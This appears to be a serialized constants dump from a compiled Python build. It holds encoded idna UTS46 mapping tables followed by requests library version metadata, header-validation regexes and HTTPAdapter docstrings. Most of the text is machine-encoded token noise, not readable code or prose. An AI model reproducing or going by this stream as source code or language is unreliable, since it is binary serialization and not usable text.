wkTlwMwlTlwMwmTlwMwnTlwMwoTlwMwpTlwMwqTlwXTlwMwsTlwMwtTlwMwuTlwMwvTlwMwwTlwMwxTlwMwyTlwXTlwMwaTlwMwbTlwMwcTlwMwdTlwMweTlwMwfTlwMwgTlwMwhTlwMwiTlwMwjTlwMwkTlwMwlTlwMwmTlwMwnTlwMwoTlwMwpTlwMwqTlwMwrTlwMwsTlwMwtTlwMwuTlwMwvTlwMwwTlwMwxTlwMwyTlwMwzTlwMwaTlwMwbTlwXTlwMwdTlwMweTlwMwfTlwMwgTlwXTlwMwiTlwMwjTlªwMwkTlêwMwlTlĪwMwmTlŪwXTlƪwMwoTlǪwXTlʪwMwsTl˪wMwtTl̪wMwuTlͪwMwvTlΪwMwwTlϪwMwxTlЪwMwyTlѪwXTlҪwMwaTlӪwMwbTlԪwMwcTlժwMwdTl֪wMweLdTlתwMwfTlتwMwgTl٪wMwhTlڪwMwiTl۪wMwjTlܪwMwkTlݪwMwlTlުwMwmTlߪwMwnTlwMwoTlwMwpTlwMwqTlwMwrTlwMwsTlwMwtTlwMwuTlwMwvTlwMwwTlwMwxTlwMwyTlwMwzTlwMwaTlwMwbTlwMwcTlwMwdTlwMweTlwMwfTlwMwgTlwMwhTlwMwiTlwMwjTlwMwkTlwMwlTlwMwmTlwMwnTlwMwoTlwMwpTlwMwqTlwMwrTlwMwsTlwMwtTlwMwuTlwMwvTlwMwwTlwMwxTlwMwyTlwMwzTlwMwaTlwMwbTlwMwcTlwMwdTlwMweTlwMwfTlwMwgTlwMwhTlwMwiTlwMwjTlwMwkTlwMwlTlwMwmTlwMwnTlwMwoTlwMwpTlwMwqTlwMwrTlwMwsTlwMwtTlwMwuTlwMwvTlwMwwTlwMwxTlwMwyTlwMwzTlwMwaTlwMwbTlwMwcTlwMwdTlwMweTlwMwfTlwMwgTlwMwhTlwMwiTlwMwjTlwMwkTlwMwlTlwMwmTlwMwnTlwMwoTlwMwpTlwMwqTlwMwrTlwMwsTlwMwtTlwMwuTlwMwvTlwMwwTlwMwxTlwMwyTlwMwzTlwMwaLdTlwMwbTlwMwcTlwMwdTlwMweTlwMwfTlwMwgTlwMwhTl«wMwiTlëwMwjTlīwMwkTlūwMwlTlƫwMwmTlǫwMwnTlȫwMwoTlɫwMwpTlʫwMwqTl˫wMwrTl̫wMwsTlͫwMwtTlΫwMwuTlϫwMwvTlЫwMwwTlѫwMwxTlҫwMwyTlӫwMwzTlԫwMwaTlիwMwbTl֫wMwcTl׫wMwdTlثwMweTl٫wMwfTlګwMwgTl۫wMwhTlܫwMwiTlݫwMwjTlޫwMwkTl߫wMwlTlwMwmTlwMwnTlwMwoTlwMwpTlwMwqTlwMwrTlwMwsTlwMwtTlwMwuTlwMwvTlwMwwTlwMwxTlwMwyTlwMwzTlwMwaTlwMwbTlwMwcTlwMwdTlwMweTlwMwfTlwMwgTlwMwhTlwMwiTlwMwjTlwMwkTlwMwlTlwMwmTlwMwnTlwMwoTlwMwpTlwMwqTlwMwrTlwMwsTlwMwtTlwMwuTlwMwvTlwMwwTlwMwxTlwMwyTlwMwzTlwMwaTlwMwbTlwMwcTlwMwdTlwMweTlwMwfTlwMwgTlwMwhTlwMwiTlwMwjTlwMwkTlwMwlTlwMwmTlwMwnTlwMwoTlwMwpTlwMwqTlwMwrTlwMwsTlwMwtTlwMwuTlwMwvTlwMwwLdTlwMwxTlwMwyTlwMwzTlwMwaTlwMwbTlwMwcTlwMwdTlwMweTlwMwfTlwMwgTlwMwhTlwMwiTlwMwjTlwMwkTlwMwlTlwMwmTlwMwnTlwMwoTlwMwpTlwMwqTlwMwrTlwMwsTlwMwtTlwMwuTlwMwvTlwMwwTlwMwxTlwMwyTlwMwzTlwMwaTlwMwbTlwMwcTlwMwdTlwMweTlwMwfTl¬wMwgTlìwMwhTlĬwMwiTlŬwMwjTlƬwMwkTlǬwMwlTlȬwMwmTlɬwMwnTlʬwMwoTlˬwMwpTl̬wMwqTlͬwMwrTlάwMwsTlϬwMwtTlЬwMwuTlѬwMwvTlҬwMwwTlӬwMwxTlԬwMwyTlլwMwzTl֬wMwaTl׬wMwbTlجwMwcTl٬wMwdTlڬwMweTl۬wMwfTlܬwMwgTlݬwMwhTlެwMwiTl߬wMwjTlwMwkTlwMwlTlwMwmTlwMwnTlwMwoTlwMwpTlwMwqTlwMwrTlwMwsTlwMwtTlwMwuTlwMwvTlwMwwTlwMwxTlwMwyTlwMwzTlwMwaTlwMwbTlwMwcTlwMwdTlwMweTlwMwfTlwMwgTlwMwhTlwMwiTlwMwjTlwMwkTlwMwlTlwMwmTlwMwnTlwMwoTlwMwpTlwMwqTlwMwrTlwMwsLdTlwMwtTlwMwuTlwMwvTlwMwwTlwMwxTlwMwyTlwMwzTlwMwaTlwMwbTlwMwcTlwMwdTlwMweTlwMwfTlwMwgTlwMwhTlwMwiTlwMwjTlwMwkTlwMwlTlwMwmTlwMwnTlwMwoTlwMwpTlwMwqTlwMwrTlwMwsTlwMwtTlwMwuTlwMwvTlwMwwTlwMwxTlwMwyTlwMwzTlwMuıTlwMuȷTlwXTlwMuαTlwMuβTlwMuγTlwMuδTlwMuεTlwMuζTlwMuηTlwMuθTlwMuιTlwMuκTlwMuλTlwMuμTlwMuνTlwMuξTlwMuοTlwMuπTlwMuρTlwMuθTlwMuσTlwMuτTlwMuυTlwMuφTlwMuχTlwMuψTlwMuωTlwMu∇Tl­wMuαTlíwMuβTlĭwMuγTlŭwMuδTlƭwMuεTlǭwMuζTlȭwMuηTlɭwMuθTlʭwMuιTl˭wMuκTḽwMuλTlͭwMuμTlέwMuνTlϭwMuξTlЭwMuοTlѭwMuπTlҭwMuρTlӭwMuσTlխwMuτTl֭wMuυTl׭wMuφTlحwMuχTl٭wMuψTlڭwMuωTlۭwMu∂TlܭwMuεTlݭwMuθTlޭwMuκTl߭wMuφTlwMuρTlwMuπTlwMuαTlwMuβTlwMuγTlwMuδTlwMuεTlwMuζTlwMuηLdTlwMuθTlwMuιTlwMuκTlwMuλTlwMuμTlwMuνTlwMuξTlwMuοTlwMuπTlwMuρTlwMuθTlwMuσTlwMuτTlwMuυTlwMuφTlwMuχTlwMuψTlwMuωTlwMu∇TlwMuαTlwMuβTlwMuγTlwMuδTlwMuεTlwMuζTlwMuηTlwMuθTlwMuιTlwMuκTlwMuλTlwMuμTlwMuνTlwMuξTlwMuοTlwMuπTlwMuρTlwMuσTlwMuτTlwMuυTlwMuφTlwMuχTlwMuψTlwMuωTlwMu∂TlwMuεTlwMuθTlwMuκTlwMuφTlwMuρTlwMuπTlwMuαTlwMuβTlwMuγTlwMuδTlwMuεTlwMuζTlwMuηTlwMuθTlwMuιTlwMuκTlwMuλTlwMuμTlwMuνTlwMuξTlwMuοTlwMuπTlwMuρTlwMuθTlwMuσTlwMuτTlwMuυTlwMuφTlwMuχTlwMuψTlwMuωTlwMu∇TlwMuαTlwMuβTlwMuγTlwMuδTlwMuεTlwMuζTlwMuηTlwMuθTlwMuιTlwMuκTlwMuλTlwMuμTl®wMuνTlîwMuξTlĮwMuοTlŮwMuπTlƮwMuρTlǮwMuσTlɮwMuτTlʮwMuυTlˮwMuφTl̮wMuχTlͮwMuψTlήwMuωLdTlϮwMu∂TlЮwMuεTlѮwMuθTlҮwMuκTlӮwMuφTlԮwMuρTlծwMuπTl֮wMuαTl׮wMuβTlخwMuγTlٮwMuδTlڮwMuεTlۮwMuζTlܮwMuηTlݮwMuθTlޮwMuιTl߮wMuκTlwMuλTlwMuμTlwMuνTlwMuξTlwMuοTlwMuπTlwMuρTlwMuθTlwMuσTlwMuτTlwMuυTlwMuφTlwMuχTlwMuψTlwMuωTlwMu∇TlwMuαTlwMuβTlwMuγTlwMuδTlwMuεTlwMuζTlwMuηTlwMuθTlwMuιTlwMuκTlwMuλTlwMuμTlwMuνTlwMuξTlwMuοTlwMuπTlwMuρTlwMuσTlwMuτTlwMuυTlwMuφTlwMuχTlwMuψTlwMuωTlwMu∂TlwMuεTlwMuθTlwMuκTlwMuφTlwMuρTlwMuπTlwMuαTlwMuβTlwMuγTlwMuδTlwMuεTlwMuζTlwMuηTlwMuθTlwMuιTlwMuκTlwMuλTlwMuμTlwMuνTlwMuξTlwMuοTlwMuπTlwMuρTlwMuθTlwMuσTlwMuτTlwMuυTlwMuφTlwMuχTlwMuψTlwMuωTlwMu∇TlwMuαTlwMuβTlwMuγTlwMuδTlwMuεTlwMuζTlwMuηTlwMuθTlwMuιTlwMuκLdTlwMuλTlwMuμTlwMuνTlwMuξTlwMuοTlwMuπTlwMuρTlwMuσTlwMuτTlwMuυTlwMuφTlwMuχTlwMuψTl¯wMuωTlïwMu∂TlįwMuεTlůwMuθTlƯwMuκTlǯwMuφTlȯwMuρTlɯwMuπTlʯwMuϝTl̯wXTlίwMw0TlϯwMw1TlЯwMw2TlѯwMw3TlүwMw4TlӯwMw5TlԯwMw6TlկwMw7Tl֯wMw8TlׯwMw9TlدwMw0TlٯwMw1TlگwMw2TlۯwMw3TlܯwMw4TlݯwMw5TlޯwMw6Tl߯wMw7TlwMw8TlwMw9TlwMw0TlwMw1TlwMw2TlwMw3TlwMw4TlwMw5TlwMw6TlwMw7TlwMw8TlwMw9TlwMw0TlwMw1TlwMw2TlwMw3TlwMw4TlwMw5TlwMw6TlwMw7TlwMw8TlwMw9TlwMw0TlwMw1TlwMw2TlwMw3TlwMw4TlwMw5TlwMw6TlwMw7TlwMw8TlwMw9TlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwMuаTlwMuбTlwMuвTlwMuгTlwMuдTlwMuеTlwMuжLdTlwMuзTlwMuиTlwMuкTlwMuлTlwMuмTlwMuоTlwMuпTlwMuрTlwMuсTlwMuтTlwMuуTlwMuфTlwMuхTlwMuцTlwMuчTlwMuшTlwMuыTlwMuэTlwMuюTlwMuꚉTlwMuәTlwMuіTlwMuјTlwMuөTlwMuүTlwMuӏTlwMuаTlwMuбTlwMuвTlwMuгTlwMuдTlwMuеTlwMuжTlwMuзTlwMuиTlwMuкTlwMuлTlwMuоTlwMuпTlwMuсTlwMuуTlwMuфTlwMuхTlwMuцTlwMuчTlwMuшTlwMuъTlwMuыTlwMuґTlwMuіTlwMuѕTlwMuџTlwMuҫTlwMuꙑTlwMuұTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwMu𞤢TlwMu𞤣TlwMu𞤤TlwMu𞤥TlwMu𞤦TlwMu𞤧TlwMu𞤨TlwMu𞤩TlwMu𞤪TlwMu𞤫TlwMu𞤬TlwMu𞤭TlwMu𞤮TlwMu𞤯LdTlwMu𞤰TlwMu𞤱TlwMu𞤲TlwMu𞤳TlwMu𞤴TlwMu𞤵TlwMu𞤶TlwMu𞤷TlwMu𞤸TlwMu𞤹TlwMu𞤺TlwMu𞤻TlwMu𞤼TlwMu𞤽TlwMu𞤾TlwMu𞤿TlwMu𞥀TlwMu𞥁TlwMu𞥂TlwMu𞥃TlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwMuاTlwMuبTlwMuجTlwMuدTlwXTlwMuوTlwMuزTlwMuحTlwMuطTlwMuيTlwMuكTlwMuلTlwMuمTlwMuنTlwMuسTlwMuعTlwMuفTlwMuصTlwMuقTlwMuرTlwMuشTlwMuتTlwMuثTlwMuخTlwMuذTlwMuضTlwMuظTlwMuغTlwMuٮTlwMuںTlwMuڡTlwMuٯTlwXTlwMuبTlwMuجTlwXTlwMuهTlwXTlwMuحTlwXTlwMuيTlwMuكTlwMuلTlwMuمTlwMuنTlwMuسTlwMuعTlwMuفTlwMuصTlwMuقTlwXTlwMuشTlwMuتTlwMuثTlwMuخTlwXTlwMuضTlwXTlwMuغTlwXTlwMuجTlwXTlwMuحTlwXTlwMuيTlwXTlwMuلTlwXTlwMuنTlwMuسLdTlwMuعTlwXTlwMuصTlwMuقTlwXTlwMuشTlwXTlwMuخTlwXTlwMuضTlwXTlwMuغTlwXTlwMuںTlwXTlwMuٯTlwXTlwMuبTlwMuجTlwXTlwMuهTlwXTlwMuحTlwMuطTlwMuيTlwMuكTlwXTlwMuمTlwMuنTlwMuسTlwMuعTlwMuفTlwMuصTlwMuقTlwXTlwMuشTlwMuتTlwMuثTlwMuخTlwXTlwMuضTlwMuظTlwMuغTlwMuٮTlwXTlwMuڡTlwXTlwMuاTlwMuبTlwMuجTlwMuدTlwMuهTlwMuوTlwMuزTlwMuحTlwMuطTlwMuيTlwXTlwMuلTlwMuمTlwMuنTlwMuسTlwMuعTlwMuفTlwMuصTlwMuقTlwMuرTlwMuشTlwMuتTlwMuثTlwMuخTlwMuذTlwMuضTlwMuظTlwMuغTlwXTlwMuبTlwMuجTlwMuدTlwXTlwMuوTlwMuزTlwMuحTlwMuطTlwMuيTlwXTlwMuلTlwMuمTlwMuنTlwMuسTlwMuعTlwMuفTlwMuصTlwMuقTlwMuرTlwMuشTlwMuتTlwMuثTlwMuخTlwMuذLdTlwMuضTlwMuظTlwMuغTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlw3u0,Tlw3u1,Tlw3u2,Tlw3u3,Tlw3u4,Tlw3u5,Tlw3u6,Tlw3u7,Tlw3u8,Tlw3u9,TlwVTlw3u(a)Tlw3u(b)Tlw3u(c)Tlw3u(d)Tlw3u(e)Tlw3u(f)Tlw3u(g)Tlw3u(h)Tlw3u(i)Tlw3u(j)Tlw3u(k)Tlw3u(l)Tlw3u(m)Tlw3u(n)Tlw3u(o)Tlw3u(p)Tlw3u(q)Tlw3u(r)Tlw3u(s)Tlw3u(t)Tlw3u(u)Tlw3u(v)Tlw3u(w)Tlw3u(x)Tlw3u(y)Tlw3u(z)TlwMu〔s〕TlwMwcTlwMwrTlwMacdTlwMawzTlwVTlwMwaTlwMwbTlwMwcTlwMwdTlwMweTlwMwfTlwMwgTlwMwhTlwMwiTlwMwjTlwMwkTlwMwlTlwMwmTlwMwnTlwMwoTlwMwpTlwMwqTlwMwrTlwMwsTlwMwtTlwMwuTlwMwvTlwMwwTlwMwxTlwMwyTlwMwzTlwMahvTlwMamvTlwMasdTlwMassTlwMappvTlwMawcTlwVTlwMamcTlwMamdTlwMamrTlwVTlwMadjTlwVLdTlwXTlwVTlwMuほかTlwMuココTlwMuサTlwXTlwMu手TlwMu字TlwMu双TlwMuデTlwMu二TlwMu多TlwMu解TlwMu天TlwMu交TlwMu映TlwMu無TlwMu料TlwMu前TlwMu後TlwMu再TlwMu新TlwMu初TlwMu終TlwMu生TlwMu販TlwMu声TlwMu吹TlwMu演TlwMu投TlwMu捕TlwMu一TlwMu三TlwMu遊TlwMu左TlwMu中TlwMu右TlwMu指TlwMu走TlwMu打TlwMu禁TlwMu空TlwMu合TlwMu満TlwMu有TlwMu月TlwMu申TlwMu割TlwMu営TlwMu配TlwXTlwMu〔本〕TlwMu〔三〕TlwMu〔二〕TlwMu〔安〕TlwMu〔点〕TlwMu〔打〕TlwMu〔盗〕TlwMu〔勝〕TlwMu〔敗〕TlwXTlwMu得TlwMu可TlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXLdTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwVTlwXTlwMw0TlwMw1TlwMw2TlwMw3TlwMw4TlwMw5TlwMw6TlwMw7TlwMw8TlwMw9TlwXTlwVTl
wXTl
wVTl
wXTl
wVTl
wXTl
wVTlwXTlwVTlwXTlwVTlwXTlwMu丽TlwMu丸TlwMu乁TlwMu𠄢TlwMu你TlwMu侮TlwMu侻TlwMu倂TlwMu偺TlwMu備TlwMu僧TlwMu像TlwMu㒞TlwMu𠘺TlwMu免TlwMu兔TlwMu兤TlwMu具TlwMu𠔜TlwMu㒹TlwMu內TlwMu再TlwMu𠕋TlwMu冗TlwMu冤TlwMu仌TlwMu冬TlwMu况TlwMu𩇟TlwMu凵TlwMu刃TlwMu㓟TlwMu刻TlwMu剆TlwMu割TlwMu剷TlwMu㔕TlwMu勇TlwMu勉TlwMu勤TlwMu勺TlwMu包TlwMu匆TlwMu北TlwMu卉TlwMu卑TlwMu博TlwMu即TlwMu卽TlwMu卿TlwMu𠨬TlwMu灰TlwMu及TlwMu叟TlwMu𠭣TlwMu叫TlwMu叱TlwMu吆TlwMu咞TlwMu吸TlwMu呈TlwMu周TlwMu咢LdTlwMu哶TlwMu唐TlwMu啓TlwMu啣TlwMu善TlwMu喙TlwMu喫TlwMu喳TlwMu嗂TlwMu圖TlwMu嘆TlwMu圗TlwMu噑TlwMu噴TlwMu切TlwMu壮TlwMu城TlwMu埴TlwMu堍TlwMu型TlwMu堲TlwMu報TlwMu墬TlwMu𡓤TlwMu売TlwMu壷TlwMu夆TlwMu多TlwMu夢TlwMu奢TlwMu𡚨TlwMu𡛪TlwMu姬TlwMu娛TlwMu娧TlwMu姘TlwMu婦TlwMu㛮TlwXTlwMu嬈TlwMu嬾TlwMu𡧈TlwMu寃TlwMu寘TlwMu寧TlwMu寳TlwMu𡬘TlwMu寿TlwMu将TlwXTlwMu尢TlwMu㞁TlwMu屠TlwMu屮TlwMu峀TlwMu岍TlwMu𡷤TlwMu嵃TlwMu𡷦TlwMu嵮TlwMu嵫TlwMu嵼TlwMu巡TlwMu巢TlwMu㠯TlwMu巽TlwMu帨TlwMu帽TlwMu幩TlwMu㡢TlwMu𢆃TlwMu㡼TlwMu庰TlwMu庳TlwMu庶TlwMu廊TlwMu𪎒TlwMu廾TlwMu𢌱TlwMu舁TlwMu弢TlwMu㣇TlwMu𣊸TlwMu𦇚TlwMu形TlwMu彫TlwMu㣣TlwMu徚TlwMu忍TlwMu志TlwMu忹TlwMu悁TlwMu㤺TlwMu㤜TlwMu悔TlwMu𢛔TlwMu惇TlwMu慈TlwMu慌TlwMu慎LdTlwMu慌TlwMu慺TlwMu憎TlwMu憲TlwMu憤TlwMu憯TlwMu懞TlwMu懲TlwMu懶TlwMu成TlwMu戛TlwMu扝TlwMu抱TlwMu拔TlwMu捐TlwMu𢬌TlwMu挽TlwMu拼TlwMu捨TlwMu掃TlwMu揤TlwMu𢯱TlwMu搢TlwMu揅TlwMu掩TlwMu㨮TlwMu摩TlwMu摾TlwMu撝TlwMu摷TlwMu㩬TlwMu敏TlwMu敬TlwMu𣀊TlwMu旣TlwMu書TlwMu晉TlwMu㬙TlwMu暑TlwMu㬈TlwMu㫤TlwMu冒TlwMu冕TlwMu最TlwMu暜TlwMu肭TlwMu䏙TlwMu朗TlwMu望TlwMu朡TlwMu杞TlwMu杓TlwMu𣏃TlwMu㭉TlwMu柺TlwMu枅TlwMu桒TlwMu梅TlwMu𣑭TlwMu梎TlwMu栟TlwMu椔TlwMu㮝TlwMu楂TlwMu榣TlwMu槪TlwMu檨TlwMu𣚣TlwMu櫛TlwMu㰘TlwMu次TlwMu𣢧TlwMu歔TlwMu㱎TlwMu歲TlwMu殟TlwMu殺TlwMu殻TlwMu𣪍TlwMu𡴋TlwMu𣫺TlwMu汎TlwMu𣲼TlwMu沿TlwMu泍TlwMu汧TlwMu洖TlwMu派TlwMu海TlwMu流TlwMu浩TlwMu浸TlwMu涅TlwMu𣴞TlwMu洴TlwMu港TlwMu湮TlwMu㴳TlwMu滋TlwMu滇LdTlwMu𣻑TlwMu淹TlwMu潮TlwMu𣽞TlwMu𣾎TlwMu濆TlwMu瀹TlwMu瀞TlwMu瀛TlwMu㶖TlwMu灊TlwMu災TlwMu灷TlwMu炭TlwMu𠔥TlwMu煅TlwMu𤉣TlwMu熜TlwXTlwMu爨TlwMu爵TlwMu牐TlwMu𤘈TlwMu犀TlwMu犕TlwMu𤜵TlwMu𤠔TlwMu獺TlwMu王TlwMu㺬TlwMu玥TlwMu㺸TlwMu瑇TlwMu瑜TlwMu瑱TlwMu璅TlwMu瓊TlwMu㼛TlwMu甤TlwMu𤰶TlwMu甾TlwMu𤲒TlwMu異TlwMu𢆟TlwMu瘐TlwMu𤾡TlwMu𤾸TlwMu𥁄TlwMu㿼TlwMu䀈TlwMu直TlwMu𥃳TlwMu𥃲TlwMu𥄙TlwMu𥄳TlwMu眞TlwMu真TlwMu睊TlwMu䀹TlwMu瞋TlwMu䁆TlwMu䂖TlwMu𥐝TlwMu硎TlwMu碌TlwMu磌TlwMu䃣TlwMu𥘦TlwMu祖TlwMu𥚚TlwMu𥛅TlwMu福TlwMu秫TlwMu䄯TlwMu穀TlwMu穊TlwMu穏TlwMu𥥼TlwMu𥪧TlwXTlwMu䈂TlwMu𥮫TlwMu篆TlwMu築TlwMu䈧TlwMu𥲀TlwMu糒TlwMu䊠TlwMu糨TlwMu糣TlwMu紀TlwMu𥾆TlwMu絣TlwMu䌁TlwMu緇TlwMu縂TlwMu繅TlwMu䌴TlwMu𦈨TlwMu𦉇LdTlwMu䍙TlwMu𦋙TlwMu罺TlwMu𦌾TlwMu羕TlwMu翺TlwMu者TlwMu𦓚TlwMu𦔣TlwMu聠TlwMu𦖨TlwMu聰TlwMu𣍟TlwMu䏕TlwMu育TlwMu脃TlwMu䐋TlwMu脾TlwMu媵TlwMu𦞧TlwMu𦞵TlwMu𣎓TlwMu𣎜TlwMu舁TlwMu舄TlwMu辞TlwMu䑫TlwMu芑TlwMu芋TlwMu芝TlwMu劳TlwMu花TlwMu芳TlwMu芽TlwMu苦TlwMu𦬼TlwMu若TlwMu茝TlwMu荣TlwMu莭TlwMu茣TlwMu莽TlwMu菧TlwMu著TlwMu荓TlwMu菊TlwMu菌TlwMu菜TlwMu𦰶TlwMu𦵫TlwMu𦳕TlwMu䔫TlwMu蓱TlwMu蓳TlwMu蔖TlwMu𧏊TlwMu蕤TlwMu𦼬TlwMu䕝TlwMu䕡TlwMu𦾱TlwMu𧃒TlwMu䕫TlwMu虐TlwMu虜TlwMu虧TlwMu虩TlwMu蚩TlwMu蚈TlwMu蜎TlwMu蛢TlwMu蝹TlwMu蜨TlwMu蝫TlwMu螆TlwXTlwMu蟡TlwMu蠁TlwMu䗹TlwMu衠TlwMu衣TlwMu𧙧TlwMu裗TlwMu裞TlwMu䘵TlwMu裺TlwMu㒻TlwMu𧢮TlwMu𧥦TlwMu䚾TlwMu䛇TlwMu誠TlwMu諭TlwMu變TlwMu豕TlwMu𧲨TlwMu貫TlwMu賁TlwMu贛TlwMu起LLTlwMu𧼯TlwMu𠠄TlwMu跋TlwMu趼TlwMu跰TlwMu𠣞TlwMu軔TlwMu輸TlwMu𨗒TlwMu𨗭TlwMu邔TlwMu郱TlwMu鄑TlwMu𨜮TlwMu鄛TlwMu鈸TlwMu鋗TlwMu鋘TlwMu鉼TlwMu鏹TlwMu鐕TlwMu𨯺TlwMu開TlwMu䦕TlwMu閷TlwMu𨵷TlwMu䧦TlwMu雃TlwMu嶲TlwMu霣TlwMu𩅅TlwMu𩈚TlwMu䩮TlwMu䩶TlwMu韠TlwMu𩐊TlwMu䪲TlwMu𩒖TlwMu頋TlwMu頩TlwMu𩖶TlwMu飢TlwMu䬳TlwMu餩TlwMu馧TlwMu駂TlwMu駾TlwMu䯎TlwMu𩬰TlwMu鬒TlwMu鱀TlwMu鳽TlwMu䳎TlwMu䳭TlwMu鵧TlwMu𪃎TlwMu䳸TlwMu𪄅TlwMu𪈎TlwMu𪊑TlwMu麻TlwMu䵖TlwMu黹TlwMu黾TlwMu鼅TlwMu鼏TlwMu鼖TlwMu鼻TlwMu𪘀TlwXTlwVTl˦wXTlЦwVTlwXTl8wITl8wXa__doc__a__file__a__spec__aoriginahas_locationa__cached__aListlaTupleaUnionu15.1.0a__version__areturnTOintOstrTOintOstrpa_seg_0a_seg_1a_seg_2a_seg_3a_seg_4a_seg_5a_seg_6a_seg_7a_seg_8a_seg_9a_seg_10a_seg_11a_seg_12a_seg_13a_seg_14a_seg_15a_seg_16a_seg_17a_seg_18a_seg_19a_seg_20a_seg_21a_seg_22a_seg_23a_seg_24a_seg_25a_seg_26a_seg_27a_seg_28a_seg_29a_seg_30a_seg_31a_seg_32a_seg_33a_seg_34a_seg_35a_seg_36a_seg_37a_seg_38a_seg_39a_seg_40a_seg_41a_seg_42a_seg_43a_seg_44a_seg_45a_seg_46a_seg_47a_seg_48a_seg_49a_seg_50a_seg_51a_seg_52a_seg_53a_seg_54a_seg_55a_seg_56a_seg_57a_seg_58a_seg_59a_seg_60a_seg_61a_seg_62a_seg_63a_seg_64a_seg_65a_seg_66a_seg_67a_seg_68a_seg_69a_seg_70a_seg_71a_seg_72a_seg_73a_seg_74a_seg_75a_seg_76a_seg_77a_seg_78a_seg_79a_seg_80a_seg_81auts46datauidna\uts46data.pyu<module idna.uts46data>u.requests.__version__a__doc__a__file__a__spec__aoriginahas_locationa__cached__arequestsa__title__uPython HTTP for Humans.a__description__uhttps://requests.readthedocs.ioa__url__u2.32.3a__version__la__build__uKenneth Reitza__author__ume@kennethreitz.orga__author_email__uApache-2.0a__license__uCopyright Kenneth Reitza__copyright__u✨ 🍰 ✨a__cake__urequests\__version__.pyu<module requests.__version__>u.requests._internal_utilsR%abuiltin_stradecodeuGiven a string object, regardless of type, returns a representation of
    that string in the native string type, encoding and decoding where
    necessary. This assumes ASCII unless told otherwise.
    aencodeTaasciiuDetermine if unicode string only contains ASCII characters.

    :param str u_string: unicode string to check. Must be unicode
        and not Python 2 `str`.
    :rtype: bool
    u
requests._internal_utils
~~~~~~~~~~~~~~

Provides utility functions that are consumed internally by Requests
which depend on extremely few external helpers (such as compat)
a__doc__a__file__a__spec__aoriginahas_locationa__cached__arelacompatTabuiltin_strlacompileTc^[^:\s][^:\r\n]*$a_VALID_HEADER_NAME_RE_BYTETu^[^:\s][^:\r\n]*$a_VALID_HEADER_NAME_RE_STRTc^\S[^\r\n]*$|^$a_VALID_HEADER_VALUE_RE_BYTETu^\S[^\r\n]*$|^$a_VALID_HEADER_VALUE_RE_STRa_HEADER_VALIDATORS_STRa_HEADER_VALIDATORS_BYTEaHEADER_VALIDATORSato_native_stringaunicode_is_asciiurequests\_internal_utils.pyu<module requests._internal_utils>TastringaencodingaoutTau_stringu.requests.adapters"AaInvalidSchemaTuMissing dependencies for SOCKS support.aurlparseaurlaschemealoweraportaconnection_pool_kwagetTassl_contexta_preloaded_ssl_contextaCERT_REQUIREDaCERT_NONEassl_contextaosapathaisdiraca_certsaca_cert_dirapool_kwargsacert_reqslacert_filelakey_fileahostahostnamea__class__a__init__uSends PreparedRequest object. Returns Response object.

        :param request: The :class:`PreparedRequest <PreparedRequest>` being sent.
        :param stream: (optional) Whether to stream the request content.
        :param timeout: (optional) How long to wait for the server to send
            data before giving up, as a float, or a :ref:`(connect timeout,
            read timeout) <timeouts>` tuple.
        :type timeout: float or tuple
        :param verify: (optional) Either a boolean, in which case it controls whether we verify
            the server's TLS certificate, or a string, in which case it must be a path
            to a CA bundle to use
        :param cert: (optional) Any user-provided SSL certificate to be trusted.
        :param proxies: (optional) The proxies dictionary to apply to the request.
        uCleans up adapter specific items.aDEFAULT_RETRIESaRetryTlFTareadamax_retriesafrom_intaselfaconfigaproxy_managera_pool_connectionsa_pool_maxsizea_pool_blockainit_poolmanagerTablocka__attrs__aitemsutoo many values to unpack (expected 2)aPoolManageranum_poolsamaxsizeablockapoolmanageruInitializes a urllib3 PoolManager.

        This method should not be called from user code, and is only
        exposed for use when subclassing the
        :class:`HTTPAdapter <requests.adapters.HTTPAdapter>`.

        :param connections: The number of urllib3 connection pools to cache.
        :param maxsize: The maximum number of connections to save in the pool.
        :param block: Block when no free connections are available.
        :param pool_kwargs: Extra keyword arguments used to initialize the Pool Manager.
        astartswithTasocksaget_auth_from_urlaSOCKSProxyManagerausernameapasswordaproxy_headersaproxy_from_urluReturn urllib3 ProxyManager for the given proxy.

        This method should not be called from user code, and is only
        exposed for use when subclassing the
        :class:`HTTPAdapter <requests.adapters.HTTPAdapter>`.

        :param proxy: The proxy to return a urllib3 ProxyManager for.
        :param proxy_kwargs: Extra keyword arguments used to configure the Proxy Manager.
        :returns: ProxyManager
        :rtype: urllib3.ProxyManager
        TahttpsaexistsuCould not find a suitable TLS CA certificate bundle, invalid path: uabasestringaconnuCould not find the TLS certificate file, invalid path: uCould not find the TLS key file, invalid path: uVerify a SSL certificate. This method should not be called from user
        code, and is only exposed for use when subclassing the
        :class:`HTTPAdapter <requests.adapters.HTTPAdapter>`.

        :param conn: The urllib3 connection object associated with the cert.
        :param url: The requested URL.
        :param verify: Either a boolean, in which case it controls whether we verify
            the server's TLS certificate, or a string, in which case it must be a path
            to a CA bundle to use
        :param cert: The SSL certificate to verify.
        aResponseastatusastatus_codeaCaseInsensitiveDictaheadersaget_encoding_from_headersaencodingarawareasonadecodeTuutf-8aextract_cookies_to_jaracookiesarequestaconnectionuBuilds a :class:`Response <requests.Response>` object from a urllib3
        response. This should not be called from user code, and is only exposed
        for use when subclassing the
        :class:`HTTPAdapter <requests.adapters.HTTPAdapter>`

        :param req: The :class:`PreparedRequest <PreparedRequest>` used to generate the response.
        :param resp: The urllib3 response object.
        :rtype: requests.Response
        a_urllib3_request_contextuBuild the PoolKey attributes used by urllib3 to return a connection.

        This looks at the PreparedRequest, the user-specified verify value,
        and the value of the cert parameter to determine what PoolKey values
        to use to select a connection from a given urllib3 Connection Pool.

